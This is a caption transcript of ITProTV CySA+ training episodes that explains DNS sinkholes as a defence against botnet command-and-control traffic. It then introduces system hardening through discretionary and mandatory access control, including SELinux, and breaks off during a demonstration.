malware.\n\n220\n00:10:42.290 --> 00:10:43.310\nIt happens all the time.\n\n221\n00:10:43.310 --> 00:10:48.320\nAnd what happens is, typically,\na lot of malware will want to,\n\n222\n00:10:48.320 --> 00:10:51.670\nis set up to create a zombie, right?\n\n223\n00:10:51.670 --> 00:10:55.550\nA botnet is what they're a lot\nof the times trying to create.\n\n224\n00:10:55.550 --> 00:10:58.310\nAnd so how do we control those bots?\n\n225\n00:10:58.310 --> 00:11:02.700\nWell, they'll phone home back to a C2 or\nCNC, also known as command and\n\n226\n00:11:02.700 --> 00:11:04.180\ncontrol server.\n\n227\n00:11:04.180 --> 00:11:08.630\nSo that the threat act or the guy or\nthe girl that is the malicious person\n\n228\n00:11:08.630 --> 00:11:12.340\nout there on the Internet going ha, ha,\nha, I've gained control of your system.\n\n229\n00:11:12.340 --> 00:11:14.970\nIt is now reached back to\nme through the Internet.\n\n230\n00:11:14.970 --> 00:11:17.720\nAnd now I can make it do this and\nmake it do that.\n\n231\n00:11:17.720 --> 00:11:23.230\nAnd I'll do a distributed denial of\nservice attack against XYZ Corp, or\n\n232\n00:11:23.230 --> 00:11:28.900\nuse it as an attack platform for something\nelse, or just snoop on your network.\n\n233\n00:11:28.900 --> 00:11:29.480\nI can do that.\n\n234\n00:11:29.480 --> 00:11:32.300\nThat's a lot of times you'll see that\n\n235\n00:11:32.300 --> 00:11:36.010\ntype of thing happening when\nit comes to what malware does.\n\n236\n00:11:36.010 --> 00:11:39.250\nSo you've got a client\nmachine on your network.\n\n237\n00:11:39.250 --> 00:11:41.470\nThey receive an email\nwith a malicious link.\n\n238\n00:11:41.470 --> 00:11:44.000\nThey click it or they download software.\n\n239\n00:11:44.000 --> 00:11:45.620\nThey got to drive by download.\n\n240\n00:11:45.620 --> 00:11:46.500\nYou name it.\n\n241\n00:11:46.500 --> 00:11:47.940\nMalware's infected their machine.\n\n242\n00:11:47.940 --> 00:11:51.890\nIt's now become a bot on\na zombie on a bot net.\n\n243\n00:11:51.890 --> 00:11:55.840\nAnd it is in a control of no bueno, right?\n\n244\n00:11:57.010 --> 00:12:00.870\nSinkholes try to help us alleviate and\nmitigate that as a threat.\n\n245\n00:12:00.870 --> 00:12:06.450\nSo what happens with a sink hole\nis it's basically DNS poisoning.\n\n246\n00:12:06.450 --> 00:12:11.320\nSo what they're gonna do is, when that\nmalware infects the machine Notice,\n\n247\n00:12:11.320 --> 00:12:12.910\nit doesn't stop the malware infection.\n\n248\n00:12:12.910 --> 00:12:16.320\nThey haven't and said, stop malware,\nno, doesn't stop it at all.\n\n249\n00:12:16.320 --> 00:12:21.290\nMalware gets infected and typically in\nthat malware when it's looking to phone\n\n250\n00:12:21.290 --> 00:12:24.790\nhome, its got a URL to contact.\n\n251\n00:12:24.790 --> 00:12:26.070\nWhat do we do with URLs?\n\n252\n00:12:26.070 --> 00:12:31.810\nWe have to say, hey DNS,\nresolve the IP address of this URL for\n\n253\n00:12:31.810 --> 00:12:35.340\nme so I know where to go,\nthat's what DNS does, it's its job, right?\n\n254\n00:12:35.340 --> 00:12:40.710\nBut what happens is,\ninstead of actually sending that out,\n\n255\n00:12:40.710 --> 00:12:44.960\nbecause your local DNS server is not\ngonna know where that URL goes to.\n\n256\n00:12:44.960 --> 00:12:48.990\nSo it's gonna have to outsource that to\nsomething like Google's DNS server, or\n\n257\n00:12:48.990 --> 00:12:50.340\na top level server, right?\n\n258\n00:12:51.370 --> 00:12:52.640\nWe don't want it to get that far.\n\n259\n00:12:52.640 --> 00:12:55.940\nWhat we're gonna do is,\ninstead, it's going to have,\n\n260\n00:12:55.940 --> 00:13:00.620\nonce you set up a sinkhole server,\na sinkhole server will be doing DNS.\n\n261\n00:13:00.620 --> 00:13:05.860\nAnd what it will do,\nis you'll have a list of known threats,\n\n262\n00:13:05.860 --> 00:13:10.700\nknown networks that are URLs\nthat are malicious.\n\n263\n00:13:10.700 --> 00:13:11.590\nAnd it will keep that list.\n\n264\n00:13:11.590 --> 00:13:12.730\nYou'll need to keep that up-to-date\n\n265\n00:13:12.730 --> 00:13:15.010\nbecause that's a very important thing,\nright?\n\n266\n00:13:15.010 --> 00:13:18.510\nSo when it does the DNS lookup,\nit's gonna look and see what you are or\n\n267\n00:13:18.510 --> 00:13:19.900\nyou're trying to look up again.\n\n268\n00:13:19.900 --> 00:13:23.670\nI'm gonna look in this list\nof known malicious URLs.\n\n269\n00:13:23.670 --> 00:13:24.930\nYou're in there.\n\n270\n00:13:24.930 --> 00:13:26.500\nNow that I know you're in theer,\n\n271\n00:13:26.500 --> 00:13:30.210\ninstead of sending URL to\nthat top level DNS server.\n\n272\n00:13:30.210 --> 00:13:35.661\nWhat I am going to do is I am going to\ntell you that the IP address is 127.0.0.1.\n\n273\n00:13:35.661 --> 00:13:38.190\nThis is a very basic set up of Sinkhole.\n\n274\n00:13:38.190 --> 00:13:39.920\nSo what does the malware try to do?\n\n275\n00:13:39.920 --> 00:13:45.988\nIt says connect to 127.0.0.1 because\nthat is where this URL resolves to.\n\n276\n00:13:45.988 --> 00:13:49.930\nBut that's local host, so\nit never makes the connection.\n\n277\n00:13:49.930 --> 00:13:52.900\nHope that you're seeing\nthe brilliance of this type of\n\n278\n00:13:52.900 --> 00:13:58.100\nmitigation countermeasure of this type\nof threat, of malware as a threat.\n\n279\n00:13:58.100 --> 00:14:01.520\nIt's able to effectively stop it at all\nand now we know there's a threat that\n\n280\n00:14:01.520 --> 00:14:08.210\noccurred, and we can go to that machine\nand remediate using anti-malware tactics.\n\n281\n00:14:08.210 --> 00:14:09.820\nAnd get that machine cleaned back up.\n\n282\n00:14:09.820 --> 00:14:12.740\nAnd now we also have known that,\nhey, they went here.\n\n283\n00:14:12.740 --> 00:14:13.880\nHere's where they got the malware.\n\n284\n00:14:13.880 --> 00:14:14.540\nThey had an email.\n\n285\n00:14:14.540 --> 00:14:15.980\nThey got the email through that.\n\n286\n00:14:15.980 --> 00:14:18.510\nWe need to do a better job\nof filtering that out,\n\n287\n00:14:18.510 --> 00:14:21.990\nmake sure it doesn't get back through,\nwe're alerted to these things.\n\n288\n00:14:21.990 --> 00:14:24.870\nThat's a very simple idea\nof what a sinkhole is.\n\n289\n00:14:24.870 --> 00:14:26.310\nLet me show you what it\nlooks like in a diagram.\n\n290\n00:14:26.310 --> 00:14:28.540\nTry to give you a more visual\nrepresentation of that,\n\n291\n00:14:28.540 --> 00:14:31.200\nI made this DNS sinkhole simple.\n\n292\n00:14:32.300 --> 00:14:33.560\nI think I double clicked it.\n\n293\n00:14:33.560 --> 00:14:34.280\nMaybe not.\n\n294\n00:14:34.280 --> 00:14:34.900\nTry again.\nHere we go.\n\n295\n00:14:36.630 --> 00:14:38.910\nAnd zoomy zoom.\n\n296\n00:14:38.910 --> 00:14:39.880\nSo here we go.\n\n297\n00:14:39.880 --> 00:14:41.830\nWe got out command control servers.\n\n298\n00:14:41.830 --> 00:14:44.290\nHere's my lovely internet cloud.\n\n299\n00:14:44.290 --> 00:14:45.650\nHere comes the malicious email.\n\n300\n00:14:45.650 --> 00:14:46.450\nGoes into the client.\n\n301\n00:14:46.450 --> 00:14:47.980\nThe client gets infected.\n\n302\n00:14:47.980 --> 00:14:49.410\nDoes the DNS query.\n\n303\n00:14:49.410 --> 00:14:51.570\nTo the DNS sinkhole server.\n\n304\n00:14:51.570 --> 00:14:53.350\nThe DNS Sinkhole response is 127.0.0.1.\n\n305\n00:14:53.350 --> 00:14:58.620\nNow, it tries to resolve that to itself.\n\n306\n00:14:58.620 --> 00:15:03.290\nIt never finds the CNC server and\nit just kinda lather, rinses, repeats.\n\n307\n00:15:03.290 --> 00:15:05.886\nIt doesn't know what do do after that.\n\n308\n00:15:05.886 --> 00:15:09.768\nYou've told me that it's 127.0.0.1\nI'm not finding it anywhere so\n\n309\n00:15:09.768 --> 00:15:11.310\nit's rendered ineffective.\n\n310\n00:15:11.310 --> 00:15:15.190\nNow it may take up some CPU cycles,\nsome memory usage, you might find that.\n\n311\n00:15:15.190 --> 00:15:17.970\nBut that's a little easier to deal with\nthan actually having somebody take over\n\n312\n00:15:17.970 --> 00:15:20.154\nyour computer, which is bad, okay?\n\n313\n00:15:20.154 --> 00:15:24.200\n&gt;&gt; [LAUGH]\n&gt;&gt; So that's a simple DNS sinkhole.\n\n314\n00:15:25.300 --> 00:15:29.550\nLet's look a little bit more\nof an advanced idea of this.\n\n315\n00:15:29.550 --> 00:15:31.160\nBring it open here.\n\n316\n00:15:31.160 --> 00:15:35.260\nAnd you'll notice we just\nadded one element here, and\n\n317\n00:15:35.260 --> 00:15:38.070\nthat is an IDS alert server.\n\n318\n00:15:38.070 --> 00:15:42.650\nSo instead of telling, it's the exact\nsame process, the email comes in,\n\n319\n00:15:42.650 --> 00:15:44.830\nthey click on the link,\nthey download the whatever.\n\n320\n00:15:44.830 --> 00:15:49.274\nWell, the malware gets installed, it does\nthe DNS queries to the DNS SQL server.\n\n321\n00:15:49.274 --> 00:15:52.571\nThe DNS SQL server says,\nI know you're bad,\n\n322\n00:15:52.571 --> 00:15:56.374\nI'm gonna send you the wrong\nIP address to resolve to.\n\n323\n00:15:56.374 --> 00:16:01.603\nAnd, but this time I'm gonna send\nit to a monitoring IDS Server so\n\n324\n00:16:01.603 --> 00:16:04.565\nthat it can look at what's going on.\n\n325\n00:16:04.565 --> 00:16:10.800\nAnd now we can actually go back to\nthat spying on the bad guy idea.\n\n326\n00:16:10.800 --> 00:16:13.620\nOf here's where they\nare trying to connect to.\n\n327\n00:16:13.620 --> 00:16:15.790\nHere's any kind of connection being made.\n\n328\n00:16:15.790 --> 00:16:19.280\nHere's the type of malware that's being,\nso we can do malware analysis.\n\n329\n00:16:19.280 --> 00:16:23.200\nWe can do all sorts of cool stuff\nby sending it down to something and\n\n330\n00:16:23.200 --> 00:16:28.450\nall you have to do is run on something\nwith a web server and an IDS IPS.\n\n331\n00:16:28.450 --> 00:16:33.700\nThat's the basic idea so you can even\nuse something ike SOCAT to connect and\n\n332\n00:16:33.700 --> 00:16:41.110\ndo two way information exchange as\na server to taken the connections.\n\n333\n00:16:41.110 --> 00:16:44.770\nAnd then the IDS and\nIPS will do its job after that and go hey.\n\n334\n00:16:44.770 --> 00:16:47.090\nOf course you have to create\nall the rules you'll need.\n\n335\n00:16:47.090 --> 00:16:50.280\nSo there is some more\nsetup to this obviously.\n\n336\n00:16:50.280 --> 00:16:54.370\nThis isn't just as simple as we just\ndon't want you to get back out.\n\n337\n00:16:54.370 --> 00:16:57.590\nI have to know a little bit\nmore about by IDS IPS system so\n\n338\n00:16:57.590 --> 00:16:59.390\nit will catch the malware attacks.\n\n339\n00:16:59.390 --> 00:17:02.650\nAnd then start logging it, I gotta be good\nwith my logging system to make sure that\n\n340\n00:17:02.650 --> 00:17:04.730\nI'm I'm getting all those logs.\n\n341\n00:17:04.730 --> 00:17:08.920\nAnd able to analyze those in a timely and\nefficient manner.\n\n342\n00:17:08.920 --> 00:17:11.170\nSo, there is a little bit more setup.\n\n343\n00:17:11.170 --> 00:17:14.470\nBut, it is a really really powerful tool.\n\n344\n00:17:14.470 --> 00:17:18.730\nSo if you can set this up and\nyou feel like you may be a fantastic\n\n345\n00:17:18.730 --> 00:17:22.930\nsolution to something to\nmitigate malware on your network.\n\n346\n00:17:22.930 --> 00:17:24.360\nIt's a good way to go.\n\n347\n00:17:24.360 --> 00:17:25.790\nLet's talk about some of the use cases.\n\n348\n00:17:25.790 --> 00:17:28.280\nObviously it's blocking connections.\n\n349\n00:17:28.280 --> 00:17:29.940\nAlso blocked drive by downloads.\n\n350\n00:17:29.940 --> 00:17:34.040\nBecause they have to do a lot of\ntimes they will do DNS resolution\n\n351\n00:17:34.040 --> 00:17:36.350\nto find the malware and\nthat will block that.\n\n352\n00:17:36.350 --> 00:17:39.230\nBecause what is that\nsinkhole server doing?\n\n353\n00:17:39.230 --> 00:17:40.380\nHey that's bad.\n\n354\n00:17:40.380 --> 00:17:42.710\nDon't go there, go here instead.\n\n355\n00:17:42.710 --> 00:17:44.842\nThat's what we're going to do.\n\n356\n00:17:44.842 --> 00:17:45.750\nSome caveats.\n\n357\n00:17:45.750 --> 00:17:48.220\nLimitations of our system here.\n\n358\n00:17:48.220 --> 00:17:51.730\nAnd hopefully,\nyou should be familiar with how DNS works.\n\n359\n00:17:51.730 --> 00:17:55.898\nSo you might be going, well what if\nthey hardcoded an IP address in there.\n\n360\n00:17:55.898 --> 00:17:56.534\n&gt;&gt; Yeah.\n&gt;&gt; Yeah.\n\n361\n00:17:56.534 --> 00:17:59.865\n&gt;&gt; [LAUGH]\n&gt;&gt; You're not doing any DNS lookups so\n\n362\n00:17:59.865 --> 00:18:01.183\n[SOUND] out you go.\n\n363\n00:18:01.183 --> 00:18:04.297\nThere are other things that we can\ndo to stop that like making sure\n\n364\n00:18:04.297 --> 00:18:07.540\nwe're monitoring outbound\nconnections through other means.\n\n365\n00:18:07.540 --> 00:18:11.650\nAnd that outbound connections don't go to\nspecific IP ranges because they're known\n\n366\n00:18:11.650 --> 00:18:14.950\nas malicious, make sure that happens.\n\n367\n00:18:14.950 --> 00:18:18.540\nSo for every measure there's\nusually a countermeasure.\n\n368\n00:18:18.540 --> 00:18:21.190\nAnd there's our countermeasure\nto our countermeasure.\n\n369\n00:18:21.190 --> 00:18:23.752\nMan, it's starting to\nfeel like inception here.\n\n370\n00:18:23.752 --> 00:18:25.680\n[LAUGH] What are some other ones?\n\n371\n00:18:25.680 --> 00:18:26.860\nIt doesn't remove malware.\n\n372\n00:18:26.860 --> 00:18:27.550\nWe talked about that.\n\n373\n00:18:27.550 --> 00:18:32.631\nIt doesn't stop the installation\nof malware either.\n\n374\n00:18:32.631 --> 00:18:35.880\nThe malicious URLs must be maintained.\n\n375\n00:18:35.880 --> 00:18:41.630\nIt's your job to make sure that that list\nfor the sinkhole server is up to date.\n\n376\n00:18:41.630 --> 00:18:45.641\nBecause as soon as a new network\npops up for a malicious actor,\n\n377\n00:18:45.641 --> 00:18:48.353\nthey are going and it's not in your list.\n\n378\n00:18:48.353 --> 00:18:50.938\nThey would be able to, in theory,\nget malware on your machine and\n\n379\n00:18:50.938 --> 00:18:52.690\ncomplete the connection to the CNC server.\n\n380\n00:18:55.450 --> 00:18:57.900\nYou might even get some false positives.\n\n381\n00:18:57.900 --> 00:19:03.751\nIf any kind of erroneous entry gets\nput in your list of malicious URLs,\n\n382\n00:19:03.751 --> 00:19:08.413\naccidentally instead of .cc\nyou do .ca on something,\n\n383\n00:19:08.413 --> 00:19:14.650\n.ca is Canada, .cc is Caicos I believe,\nsomething like that.\n\n384\n00:19:14.650 --> 00:19:18.260\nAnyway, you wanna make sure that\nyou're not blocking anything that you\n\n385\n00:19:18.260 --> 00:19:19.360\nactually want to have access to.\n\n386\n00:19:19.360 --> 00:19:21.170\nSo you have to verify that list.\n\n387\n00:19:21.170 --> 00:19:26.276\nThat maintaining of that malicious\nURL list is key and crucial to making\n\n388\n00:19:26.276 --> 00:19:32.340\nsure that your SQL server is as efficient\nand effective as you can make it be.\n\n389\n00:19:32.340 --> 00:19:37.730\nOther than that, that's basically how\nhoney pots and sinkholes work go young,\n\n390\n00:19:37.730 --> 00:19:42.190\nyoung padawans and chew on this and make\nsure you understand it because you may get\n\n391\n00:19:42.190 --> 00:19:45.172\nan exam question or\ntwo on these very topics.\n\n392\n00:19:45.172 --> 00:19:46.660\n&gt;&gt; All right, Daniel.\n\n393\n00:19:46.660 --> 00:19:47.510\nThank you again for\n\n394\n00:19:47.510 --> 00:19:51.050\nhelping us at least understand a little\nbit more about these two countermeasures.\n\n395\n00:19:51.050 --> 00:19:54.330\nThe idea of using honeypots\nas well as sinkholes too.\n\n396\n00:19:54.330 --> 00:19:58.890\nTake a look at both of these technologies\nbecause they are very interesting and\n\n397\n00:19:58.890 --> 00:20:01.850\nsome of the will, of course, be a little\nbit more technically challenging.\n\n398\n00:20:01.850 --> 00:20:03.290\nThe idea of the sinkhole.\n\n399\n00:20:03.290 --> 00:20:06.010\nIf you're just beginning,\nit doesn't make sense when you go,\n\n400\n00:20:06.010 --> 00:20:10.380\nwhoa, it's not connecting back, but\nit's not really connecting to you either.\n\n401\n00:20:10.380 --> 00:20:11.400\nIt's not allowing you to [INAUDIBLE].\n\n402\n00:20:11.400 --> 00:20:14.490\nIt doesn't make sense, but\nas you start reviewing it more and more,\n\n403\n00:20:14.490 --> 00:20:18.030\nyou understand that it's just not sending\nthe information where it needs to go.\n\n404\n00:20:18.030 --> 00:20:20.590\nSo that's a big part of security as well,\nwhich is not\n\n405\n00:20:20.590 --> 00:20:24.150\nallowing the ultimate connection\nthat a bad guy wants to make too.\n\n406\n00:20:24.150 --> 00:20:27.010\nBut there is more to come and\nthat's just the beginning for\n\n407\n00:20:27.010 --> 00:20:30.610\ncalendar measures as well so there is\nmore that we'll see there later on.\n\n408\n00:20:30.610 --> 00:20:32.630\nBut that will be for another episode.\n\n409\n00:20:32.630 --> 00:20:35.150\nSo sing in of for ITProTV.\n\n410\n00:20:35.150 --> 00:20:36.490\nI'm your host Ronnie Wong.\n\n411\n00:20:36.490 --> 00:20:37.440\n&gt;&gt; And I'm Daniel Lowrie.\n\n412\n00:20:37.440

[CROSSTALK]\n\n3\n00:00:05.797 --> 00:00:08.042\n[MUSIC]\n\n4\n00:00:08.042 --> 00:00:13.860\n&gt;&gt; You're watching ITProTV.\n&gt;&gt; Welcome to another great episode,\n\n5\n00:00:13.860 --> 00:00:14.940\nright here on ITProTV.\n\n6\n00:00:14.940 --> 00:00:18.950\nYou're watching the Comptia SySA+ show.\n\n7\n00:00:18.950 --> 00:00:20.350\nI'm your host, Ronnie Wong.\n\n8\n00:00:20.350 --> 00:00:23.330\nAnd today, we're taking a look at\nadditional counter measures, but\n\n9\n00:00:23.330 --> 00:00:28.210\nwe're actually gonna be spending some time\nand talk about system hardening and N-A-C,\n\n10\n00:00:28.210 --> 00:00:32.910\nNAC, which stands for network access\ncontroll, if I remember correctly here.\n\n11\n00:00:32.910 --> 00:00:34.053\n&gt;&gt; Thank you for remembering.\n\n12\n00:00:34.053 --> 00:00:36.400\n[LAUGH]\n&gt;&gt; And so, yeah, it does stand for that.\n\n13\n00:00:36.400 --> 00:00:38.660\nAnd of course,\nif you are unfamiliar with this,\n\n14\n00:00:38.660 --> 00:00:41.730\nwe've got the right person on hand\nto help us understand this better.\n\n15\n00:00:41.730 --> 00:00:44.320\nAnd to help you understand it, it's\ngoing to be Mr. Daniel Lowrie himself.\n\n16\n00:00:44.320 --> 00:00:47.320\nDaniel, welcome back to the show.\n&gt;&gt; I am welcome to be back in the show.\n\n17\n00:00:47.320 --> 00:00:48.070\nThank you, Ronnie.\n\n18\n00:00:48.070 --> 00:00:49.840\nAnd always glad to be here.\n\n19\n00:00:49.840 --> 00:00:52.260\nToday, we are talking\na bit of system hardening.\n\n20\n00:00:52.260 --> 00:00:54.680\nFor the most part, that's what\nwe're gonna be taking a look at,\n\n21\n00:00:54.680 --> 00:00:58.840\nsome of the techniques that we\ncan use to harden a system so\n\n22\n00:00:58.840 --> 00:01:02.850\nthat its security profile\nis one of that is\n\n23\n00:01:02.850 --> 00:01:07.880\nnot enticing to the bad actor out there\nlooking to gain access to something.\n\n24\n00:01:07.880 --> 00:01:10.010\nNow, there are those people\nthat just don't give up, and\n\n25\n00:01:10.010 --> 00:01:11.450\nthey're a tenacious bunch.\n\n26\n00:01:11.450 --> 00:01:15.120\nBut why give it to them just\nout of the gate, right?\n\n27\n00:01:15.120 --> 00:01:19.230\nSo let's do everything we can to\nmake it as difficult as possible.\n\n28\n00:01:19.230 --> 00:01:20.868\nAnd that's why we use the term hardening.\n\n29\n00:01:20.868 --> 00:01:25.569\nWe're basically putting armor onto our\nsystems so that they are as difficult\n\n30\n00:01:25.569 --> 00:01:30.220\nas possible to get through that armor and\ngain access to the system at hand.\n\n31\n00:01:30.220 --> 00:01:31.220\nAnd that's what we're gonna look at.\n\n32\n00:01:31.220 --> 00:01:32.030\nAnd then of course,\n\n33\n00:01:32.030 --> 00:01:35.810\nwe're just gonna briefly gonna\ngo over a bit of what NAC is.\n\n34\n00:01:35.810 --> 00:01:38.458\nRonnie has already so graciously\ndefined what the acronym stands for,\n\n35\n00:01:38.458 --> 00:01:39.440\nnetwork access control.\n\n36\n00:01:39.440 --> 00:01:42.300\nWe're just gonna talk a little bit about\nthe different types of NAC systems\n\n37\n00:01:42.300 --> 00:01:44.970\nyou might see,\nsince you're familiar with that.\n\n38\n00:01:44.970 --> 00:01:46.730\nSo let's talk about system hardening.\n\n39\n00:01:46.730 --> 00:01:47.410\nLet's get into that.\n\n40\n00:01:47.410 --> 00:01:51.770\nFirst thing we're gonna talk about when it\ncomes to techniques in that hardening is\n\n41\n00:01:51.770 --> 00:01:52.755\naccess control.\n\n42\n00:01:52.755 --> 00:01:57.480\nAnd we've seen access control lists,\nand that even does kind of play\n\n43\n00:01:57.480 --> 00:02:02.360\ninto access control, cuz it is an access\ncontrol list, they are related.\n\n44\n00:02:02.360 --> 00:02:03.836\nBut in a system,\n\n45\n00:02:03.836 --> 00:02:09.750\nyou might be able to employ two\ndifferent types of access control.\n\n46\n00:02:09.750 --> 00:02:14.030\nAnd when I say system, I'm typically\ntalking about operating systems.\n\n47\n00:02:14.030 --> 00:02:20.270\nSo Microsoft Windows, Mac OS, or\nsome variant of Unix or Linux, okay?\n\n48\n00:02:20.270 --> 00:02:23.910\nAnd we have two different types that\nwe're gonna be called out in an exam\n\n49\n00:02:23.910 --> 00:02:28.500\nenvironment, which is mandatory access\ncontrol, and discretionary access control.\n\n50\n00:02:28.500 --> 00:02:31.180\nWhat's the difference between the two,\nand why would I use one over the other?\n\n51\n00:02:31.180 --> 00:02:33.880\nWell, we'll start with\ndiscretionary access control.\n\n52\n00:02:34.960 --> 00:02:37.230\nIt's normally what you see.\n\n53\n00:02:37.230 --> 00:02:42.970\nAnd what is, it's access control\nthat's at the owner's discretion.\n\n54\n00:02:42.970 --> 00:02:43.850\nI can change it,\n\n55\n00:02:43.850 --> 00:02:47.650\nI can modify it, I can remove it\nall completely if I feel like it.\n\n56\n00:02:47.650 --> 00:02:48.590\nIt's at my discretion.\n\n57\n00:02:48.590 --> 00:02:53.340\nSo if I create a file, or\nI have an object that has access, and\n\n58\n00:02:53.340 --> 00:02:56.680\nI can create permissions for\naccess to that object,\n\n59\n00:02:56.680 --> 00:03:01.240\nas the owner, at my discretion,\nI can change that at my will.\n\n60\n00:03:01.240 --> 00:03:04.080\nThat's discretionary access control.\n\n61\n00:03:04.080 --> 00:03:08.980\nMandatory access control is different\nin the way that we're setting\n\n62\n00:03:08.980 --> 00:03:13.090\npermissions on an object, but those\npermissions are not meant to be changed.\n\n63\n00:03:13.090 --> 00:03:18.280\nIt is mandatory that this type of\nobject gets this type of permission.\n\n64\n00:03:18.280 --> 00:03:23.520\nAnd even the owner itself, the person that\ncreated that, cannot change it, right?\n\n65\n00:03:23.520 --> 00:03:25.230\nSo it's meant to keep it safe.\n\n66\n00:03:25.230 --> 00:03:27.330\nIt's meant to keep it immutable.\n\n67\n00:03:27.330 --> 00:03:30.210\nAnd we would want this kind\nof thing on things like,\n\n68\n00:03:30.210 --> 00:03:32.330\nI don't know, kernel system files.\n\n69\n00:03:32.330 --> 00:03:36.560\nThat might be a good\nthing to not fiddle with,\n\n70\n00:03:36.560 --> 00:03:40.790\ncuz if you do,\nit can break the whole system.\n\n71\n00:03:40.790 --> 00:03:45.020\nOr maybe I'm a really\ngood bad actor out there.\n\n72\n00:03:45.020 --> 00:03:49.600\nI know coding,\nI create advanced persistent threats\n\n73\n00:03:49.600 --> 00:03:54.000\nthat get installed on the system,\nand they take over system files, and\n\n74\n00:03:54.000 --> 00:03:57.850\nthey do the system file job, but\nit also does a little bit extra, right?\n\n75\n00:03:57.850 --> 00:04:01.410\nSo I wanna be able keep them from\nreplacing any kind of system files or\n\n76\n00:04:01.410 --> 00:04:07.340\nmodifying system files, or anything\nthat I deem to be of utmost importance.\n\n77\n00:04:07.340 --> 00:04:09.600\nAnd I need it to be immutable.\n\n78\n00:04:09.600 --> 00:04:12.020\nNow, let's talk Windows for a second.\n\n79\n00:04:13.300 --> 00:04:18.050\nPreparing for this show, I'm like I wonder\nif, I don't remember ever seeing anything\n\n80\n00:04:18.050 --> 00:04:21.280\nspecifically about, and\nRonnie maybe you can jump in here.\n\n81\n00:04:21.280 --> 00:04:24.665\nI've never seen anything that said\nhere is mandatory access control\n\n82\n00:04:24.665 --> 00:04:27.236\ninside of a Windows operating system.\n&gt;&gt; Yeah,\n\n83\n00:04:27.236 --> 00:04:27.926\nI haven't seen it.\n&gt;&gt; Ronnie,\n\n84\n00:04:27.926 --> 00:04:28.670\nnothing?\n&gt;&gt; No.\n\n85\n00:04:28.670 --> 00:04:29.270\n&gt;&gt; De nada, right?\n\n86\n00:04:29.270 --> 00:04:29.935\n&gt;&gt; Yeah.\n\n87\n00:04:29.935 --> 00:04:30.960\n&gt;&gt; Talked to Mike about it.\n\n88\n00:04:30.960 --> 00:04:32.300\nHe's super Windows guru.\n\n89\n00:04:32.300 --> 00:04:33.610\nHe knows a lot about that.\n\n90\n00:04:33.610 --> 00:04:35.750\nI've worked in Windows environments.\n\n91\n00:04:35.750 --> 00:04:40.290\nThe best I could find was that there\nis a built-in thing called mandatory\n\n92\n00:04:40.290 --> 00:04:42.904\nintegrity labels and lists.\n&gt;&gt; Well,\n\n93\n00:04:42.904 --> 00:04:43.470\nlevel-\n&gt;&gt; Levels\n\n94\n00:04:43.470 --> 00:04:44.220\n[CROSSTALK]\n&gt;&gt; Levels.\n\n95\n00:04:44.220 --> 00:04:46.170\n&gt;&gt; Yeah there was.\n\n96\n00:04:46.170 --> 00:04:48.960\nSo, but this is kind of baked\ninto the operating system.\n\n97\n00:04:48.960 --> 00:04:51.640\nThis is not something that we mess with.\n\n98\n00:04:51.640 --> 00:04:52.677\nIt's in there, but\n\n99\n00:04:52.677 --> 00:04:56.467\nit protects certain files in the system\nto keep them from being modified.\n\n100\n00:04:56.467 --> 00:04:58.630\nAnd there you go, that's done.\n\n101\n00:04:58.630 --> 00:05:01.670\nWe don't come in and set these things up.\n\n102\n00:05:01.670 --> 00:05:04.670\nIt's the rest of everything else is just,\n\n103\n00:05:04.670 --> 00:05:09.490\nis DAC, it's discretionary access\ncontrol inside of Windows.\n\n104\n00:05:09.490 --> 00:05:15.720\nOther than that baked in business of the\nMILs, I think they were referred to as.\n\n105\n00:05:15.720 --> 00:05:20.413\nAnd Linux, they did see a need for\na mandatory access control to be available\n\n106\n00:05:20.413 --> 00:05:24.580\nto the system administrators in some way,\nshape, or form.\n\n107\n00:05:24.580 --> 00:05:27.780\nSo now, we have something,\nand because of that,\n\n108\n00:05:27.780 --> 00:05:31.710\nthere was a purposeful project that\nwas initiated, and that was SELinux.\n\n109\n00:05:31.710 --> 00:05:34.990\nAnd if you're running any kind of Fedora,\nRed Hat,\n\n110\n00:05:34.990 --> 00:05:37.960\nCentOS, you have SELinux\nrunning by default.\n\n111\n00:05:37.960 --> 00:05:43.490\nYou may have turned it off, which we don't\nrecommend, because this is what basically\n\n112\n00:05:43.490 --> 00:05:49.770\nkeeps you from, if you install malware and\nit tries to jump out,\n\n113\n00:05:49.770 --> 00:05:54.380\nit sandboxes that environment, so\nthat it can't go beyond its own borders.\n\n114\n00:05:54.380 --> 00:05:58.600\nYou can't have access to this\nbecause you are not the type and\n\n115\n00:05:58.600 --> 00:06:02.550\nproperties and permissions for\naccess to that.\n\n116\n00:06:02.550 --> 00:06:03.910\nWe have mandatory access control.\n\n117\n00:06:05.060 --> 00:06:06.790\nAnd as long as enforcing is enabled, and\n\n118\n00:06:06.790 --> 00:06:10.170\nyou haven't turned that enforcing off,\nwhich, correct me if I'm wrong,\n\n119\n00:06:10.170 --> 00:06:14.435\nis default setting for SE Linux,\nthen you should be good to go.\n\n120\n00:06:14.435 --> 00:06:20.980\nAnd you can create custom sets,\ncustom labels, custom, I forget the other\n\n121\n00:06:20.980 --> 00:06:24.770\nterminology because I'm not really\nfamiliar with SELinux as I should be.\n\n122\n00:06:24.770 --> 00:06:27.440\nBut you can't create the custom thing.\n\n123\n00:06:27.440 --> 00:06:31.100\nSo if you needed to create a set of files\nor something, you can make file type\n\n124\n00:06:31.100 --> 00:06:35.410\nat set permissions of this type, and\nno one would be able to delete it.\n\n125\n00:06:35.410 --> 00:06:38.230\nThere's also another\ntool built into Linux.\n\n126\n00:06:38.230 --> 00:06:40.500\nLet me jump over to, yeah, here we go.\n\n127\n00:06:40.500 --> 00:06:42.570\nI'll get on my CentOS box here.\n\n128\n00:06:42.570 --> 00:06:43.500\nTry to log in.\n\n129\n00:06:43.500 --> 00:06:45.030\nOops, yes, I know that didn't work.\n\n130\n00:06:46.360 --> 00:06:51.249\nLet me login, and I'll get a terminal\ngoing, there's a [INAUDIBLE].\n\n131\n00:06:51.249 --> 00:06:52.240\nDon't need you.\n\n132\n00:06:52.240 --> 00:06:53.751\nThere we go.\n\n133\n00:06:53.751 --> 00:06:57.067\nLet me get this terminal a little larger,\nand\n\n134\n00:06:57.067 --> 00:07:01.430\nI will say Ctrl+Shift,\nplus plus plus, plus plus.\n\n135\n00:07:01.430 --> 00:07:04.640\nThere we go, nice and large for\nyou good folks out there to see.\n\n136\n00:07:04.640 --> 00:07:10.120\nAnd I've got this\nimportant.txt right here.\n\n137\n00:07:10.120 --> 00:07:14.040\nNow, you'll see the owner, and\nthe group owner, which is me, dlowrie.\n\n138\n00:07:14.040 --> 00:07:18.640\nI created the file,\nI modified the contents of the file, and\n\n139\n00:07:18.640 --> 00:07:21.360\nthen I wanted to make it\nimmutable because it's 